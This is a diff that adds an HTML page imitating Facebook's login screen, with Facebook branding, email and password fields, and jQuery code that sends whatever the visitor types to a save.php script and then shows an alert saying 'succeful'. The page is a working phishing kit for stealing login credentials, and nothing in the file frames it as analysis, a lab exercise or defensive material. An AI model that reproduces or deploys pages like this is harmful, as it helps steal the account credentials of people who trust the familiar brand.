@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,shrink-to-fit=yes">
+    <title>Document</title>
+    <link rel="stylesheet" href="style/style.css">
+
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+    <script type="text/javascript"></script>
+
+</head>
+
+<body>
+    <div class="textbox">
+        <h1>
+            facebook
+        </h1>
+        <h2>
+            Facebook helps you connect and share<br> with the people in your life.
+        </h2>
+    </div>
+
+
+    <div class="container">
+        <div class="form">
+            <input type="text" id="email" class="text" placeholder="Enter Your Email or Phone number"> <br>
+            <input type="password" id="password" class="text" placeholder="Password"><br>
+            <button id="send" name="save" class="send">
+                login
+            </button>
+            <p><a href="">forgot password?</a><br></p>
+            <div class="btn">
+                <button>Create New Account</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+
+        $(document).ready(function () {
+            $("#send").click(function () {
+
+
+                var password = $("#password").val();
+                var email = $('#email').val();
+                console.log(password + email)
+
+                if (password != "" && email != "") {
+                    $.ajax({
+                        url: "save.php",
+                        type: "POST",
+                        data: {
+                            password: password,
+                            email: email,
+
+
+                        },
+                        cache: false,
+                        success: function (dataResult) {
+                            var dataResult = JSON.parse(dataResult);
+                            // if (dataResult.statusCode == 200) {
+                            //     $("#butsave").removeAttr("disabled");
+                            //     $("#fupForm").find('input:text');
+                            //     $("#success").show();
+                            //     $("#success").html('Data added bobo')
+
+                            // }
+                            // else if (dataResult.statusCode == 201) {
+                            //     alert("error")
+                            // }
+                            alert("succeful")
+                        }
+                    });
+                }
+                else {
+                    alert("fill fields")
+                }
+            })
+        })
+    </script>
+</body>
+
+</html>
